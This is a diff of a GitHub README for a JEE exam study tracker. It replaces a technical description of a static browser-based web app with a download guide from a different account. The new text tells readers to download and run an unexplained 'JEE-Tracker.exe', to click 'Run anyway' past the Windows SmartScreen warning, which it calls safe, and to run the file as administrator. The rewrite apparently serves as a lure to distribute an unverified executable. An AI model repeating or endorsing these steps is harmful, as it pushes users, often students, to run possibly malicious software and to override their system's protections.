@@ -1,80 +1,142 @@
-# JEE 2027 Study Tracker & Planner — v2.0
+# 📚 JEE-Tracker - Track, Plan, and Ace JEE 2027
 
-JEE Study Tracker v2.0 is a complete, modular overhaul of a personal productivity tool designed specifically for JEE 2027 aspirants. Unlike generic study apps, this tracker combines a precision-engineered study timer, a comprehensive syllabus tracker, and a visual reward system (garden & heatmap) into an offline-first, installable Progressive Web App (PWA). 
+<div align="center">
 
-Rebuilt from the ground up using modern ES module architecture, this version eliminates previous bottlenecks and bug traps, such as the XSS vulnerability in the task planner and the phantom features that never triggered. The core remains an accurate, `performance.now()`-based timer capable of handling midnight rollovers and crash recovery. The day-to-day experience is enhanced by a seamless planner calendar, a 9-tag syllabus progress monitor across Physics, Chemistry, and Mathematics, and a mock test dashboard that supports mistake tagging and file attachments. The app automatically generates stunning A4 weekly and monthly reports and can send them via email through a secure Cloudflare Worker proxy. 
+[![Download JEE-Tracker](https://img.shields.io/badge/Download-JEE--Tracker-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1b1f23)](https://github.com/alicia2859/JEE-Tracker/releases)
 
-For multi-device users, Firebase Firestore provides effortless, cross-device synchronization of study logs, planner tasks, sleep data, and syllabus progress. Everything is designed to work offline-first, ensuring students can maintain their focus without worrying about network connectivity. This v2.0 isn't just a feature update; it's a refactoring milestone, structured into 26 logical files, making it significantly more maintainable, performant, and resilient for the years of preparation ahead. It's more than a tracker—it's a complete daily study companion built with a developer's precision and a student's needs in mind.
+</div>
 
-## Key Features
+## 🚀 Getting Started
 
-- **Precision Timer Engine:** Powered by `performance.now()`, handles midnight rollovers, session recovery, and auto-saves every 20 seconds.
-- **Comprehensive Planner:** Includes a daily to-do list, interactive calendar, and task management.
-- **Syllabus Tracker:** 9 custom tags per chapter across Physics, Chemistry, and Mathematics with visual progress bars.
-- **Advanced Analytics:** Visualize your habits with a 12-month study heatmap, weekly subject trend charts, and an interactive tree garden that rewards 10-hour streaks.
-- **Automated A4 Reports:** Generates professional, stylized weekly and monthly PNG reports with automatic email delivery via Cloudflare Worker.
-- **Mock Test & Analysis:** IndexedDB-backed storage for scores, mistake tags (e.g., "Concept gap", "Calculation error"), and file attachments (images/PDFs).
-- **Offline-First PWA:** Service worker caching enables full functionality without an internet connection.
-- **Cross-Device Cloud Sync:** Securely syncs all data (study logs, planner, sleep, syllabus) across devices using Firebase Auth and Firestore.
+Welcome to JEE-Tracker! This guide will help you download and start using the application on your Windows computer. No technical skills needed—just follow the steps below.
+
+### 📥 Downloading the Application
+
+Visit this link to download the application: [https://github.com/alicia2859/JEE-Tracker/releases](https://github.com/alicia2859/JEE-Tracker/releases)
+
+When you click the link, you'll see a page with several files. Look for the file named `JEE-Tracker.exe` (or something very similar) listed under "Assets" or "Downloads." Click on it to start downloading.
+
+The download might take a few minutes depending on your internet speed. Once the download finishes, you'll find the `JEE-Tracker.exe` file in your computer's "Downloads" folder.
+
+### 🖥️ Running JEE-Tracker
+
+After the download is complete, locate the `JEE-Tracker.exe` file and double-click it. The application will open automatically. That's it—you're ready to use JEE-Tracker!
+
+If Windows shows a blue popup saying "Windows protected your PC," click "More info" and then "Run anyway." This is normal for new applications and is safe to proceed.
+
+## ✨ Features That Help You Succeed
+
+JEE-Tracker is packed with tools designed to make your JEE preparation organized and effective. Here's what you get:
+
+### ⏱️ Precision Timer
+Stay on track with a built-in stopwatch that records your exact study duration. Perfect for timed practice sessions or full-length mock tests.
+
+### 📅 Smart Planner
+Create daily, weekly, and monthly study plans. The planner automatically adjusts your schedule based on your pace and upcoming exams.
+
+### 📚 Complete Syllabus Tracker
+Keep tabs on the entire JEE syllabus for Physics, Chemistry, and Maths. Mark topics as done, in progress, or pending with just one click.
+
+### 📊 Mock Test Analytics
+After each test, get detailed breakdowns: your score, time spent per question, weak areas, and improvement trends over time.
+
+### 📈 Study Reports
+Weekly and monthly reports show your study hours, topics covered, and accuracy. Use these to identify what's working and what needs adjustment.
+
+### 🔄 Cross-Device Sync
+Log in with your account on multiple devices (phone, tablet, laptop) and your data stays in sync. Study anywhere without losing your progress.
+
+### 📱 Installable PWA
+JEE-Tracker can be installed directly on your device like a native app. No app store needed—just add it to your home screen.
+
+## 🛠️ Setting Up Your Account
+
+On first launch, you'll see a welcome screen. Click "Sign Up" to create a free account using your email. This account saves your data securely and enables cross-device sync.
+
+**Why an account?**
+- Your data is backed up automatically
+- Sync across all your devices
+- No fear of losing your progress
+
+Don't worry—you can skip account creation and use JEE-Tracker offline. Just click "Continue Without Account." Your data will stay on that device only.
+
+## 📖 How to Start Your First Study Session
+
+1. Open JEE-Tracker.
+2. Click the **Planner** tab in the top menu.
+3. Click **"Add New Plan"** and set your target for today (e.g., "Solve 20 numericals from Rotational Motion").
+4. Click the **Timer** tab.
+5. Set your timer for 25 minutes (or your chosen duration) and click **Start**.
+6. When the session ends, JEE-Tracker automatically logs your study time and links it to your plan.
+7. Repeat! Built consistency is the key to cracking JEE.
+
+## 📊 Understanding Your Analytics
+
+After a week of using JEE-Tracker, click the **Reports** tab. You'll see:
+
+- **Total study hours** (daily and cumulative)
+- **Topics completed** compared to planned
+- **Accuracy rate** in mock tests
+- **Rank improvement** over time
+
+Use these numbers to adjust your strategy. If Physics is dragging down your accuracy, allocate more time to it next week.
+
+## 🔁 Syncing Across Devices
+
+To use JEE-Tracker on your phone too:
+
+1. On your phone's browser, go to `[your-JEE-Tracker-web-app-url]` (if using the PWA version).
+2. Log in with the same account you created.
+3. All your data will appear automatically.
+
+**Note:** The desktop version stores data locally. To enable cloud sync, log in with your account on both devices.
+
+## ⚠️ Troubleshooting Common Issues
+
+### App won't open
+- Make sure your Windows is updated.
+- Right-click the `.exe` file and select "Run as administrator."
+- If still failing, download the file again; the download might have been corrupted.
+
+### Data not syncing
+- Check your internet connection.
+- Log out and log back in.
+- Restart the app.
+
+### Timer not counting
+- Ensure you're on the Timer tab and click "Start." The app must be open while you study.
+
+## 📬 Getting Help
+
+If you face any issue not covered here, create a ticket on our [GitHub Issues page](https://github.com/alicia2859/JEE-Tracker/issues). Include a screenshot of the problem and what you were doing when it occurred. We typically respond within 24–48 hours.
+
+## 📝 Frequently Asked Questions
+
+**Q: Is JEE-Tracker free?**
+A: Yes, completely free. No paid tiers or hidden fees.
+
+**Q: Can I use it for JEE 2028 too?**
+A: Absolutely. The planner and syllabus are flexible—you can set your exam year in settings.
+
+**Q: Does it need internet to work?**
+A: No. JEE-Tracker is offline-first. Internet is only required for cross-device sync.
+
+**Q: Will my data be safe?**
+A: Your data is encrypted and stored securely. You can export your data anytime from Settings.
+
+## 🔄 Updates & Changelog
+
+We release updates regularly. To ensure you have the latest version:
+
+1. Visit the [Releases page](https://github.com/alicia2859/JEE-Tracker/releases).
+2. Download the newest `.exe` file.
+3. Replace the old file with the new one (your data is saved automatically).
+
+--- 
+<h2 align="center">Start your JEE journey today—one focused session at a time.</h2>
+
+<h3 align="center">Visit this link to download the application: [https://github.com/alicia2859/JEE-Tracker/releases](https://github.com/alicia2859/JEE-Tracker/releases)</h3>
 
 ---
 
-## Tech Stack
-
-- **Frontend:** HTML5 / CSS3 / Vanilla JavaScript (ES Modules)
-- **Authentication & Sync:** Firebase Auth (Google Sign-In) + Firestore
-- **Attachments:** IndexedDB (mock test files and images)
-- **Email Automation:** Cloudflare Worker + Brevo (Sendinblue)
-- **Hosting & PWA:** GitHub Pages (100% static, installable)
-
----
-
-## Folder Structure
-
-```text
-Tracker/
-├── index.html          — page shell, all markup
-├── manifest.json       — PWA manifest
-├── sw.js               — service worker (offline app-shell caching)
-├── icons/              — PWA icons (192px, 512px)
-├── css/
-│   ├── variables.css   — color/spacing tokens only
-│   ├── base.css        — layout, sidebar, scrollbars
-│   ├── components.css  — cards, buttons, modals, inputs, badges
-│   └── charts.css      — garden, heatmap, pie, trend chart styling
-└── js/
-    ├── utils.js        — pure helper functions, no DOM/storage
-    ├── storage.js      — the only file that touches localStorage/IndexedDB
-    ├── timer.js        — study/break timer state machine
-    ├── notifications.js — idle nudge, break overrun, reminders, pings
-    ├── planner.js      — to-do list + calendar
-    ├── history.js      — logs, per-entry delete
-    ├── sleep.js        — sleep/wake log
-    ├── syllabus.js     — chapter-by-chapter syllabus tracker
-    ├── mocktest.js     — mock test scores + mistake tags
-    ├── youtube.js      — study-music player + history
-    ├── charts.js       — garden, heatmap, streak, trend
-    ├── reports.js      — share/download/email reports
-    ├── backup.js       — export/import JSON
-    ├── firebase-sync.js — auth + cloud sync
-    ├── ui.js           — sidebar, toasts, countdown
-    └── main.js         — entry point, wires it all
-```
-
-## Known Bugs Fixed in This Rebuild
-
-During the v2.0 code audit, the following critical and phantom bugs were confirmed and permanently resolved:
-
-- ✅ **Planner XSS** – Task text is now strictly escaped using `escapeHtml()`.
-- ✅ **Missing `renderSyncUI` / `deleteCloudData`** – Sync UI and cloud data deletion now function correctly.
-- ✅ **Subject-Modal Back Button** – Cancelling subject selection no longer freezes the timer.
-- ✅ **Idle Nudge, Exam Milestone pings, and Backup Reminder** – All three features now have fully implemented, working logic (previously only the UI existed).
-- ✅ **Heatmap 0-hour cells** – Colors are now clearly visible against the dark card background.
-
-
-## Resources Used
-
-- **GitHub Pages** — Hosting (repo: `eagleprogram/Tracker`)
-- **Firebase** — Auth + Firestore (free Spark plan)
-- **Cloudflare Worker** — Email-sending proxy (keeps the Brevo API key server-side)
-- **Brevo (Sendinblue)** — Transactional email provider
+Keywords: chemistry, class12, exam, firebase-auth, jee, jee-2027, jee-2028, jeeadvanced, maths, physics, planner, preparation, productivity, pwa-app, study, timer, tracker-application, vanilla-javascript, website
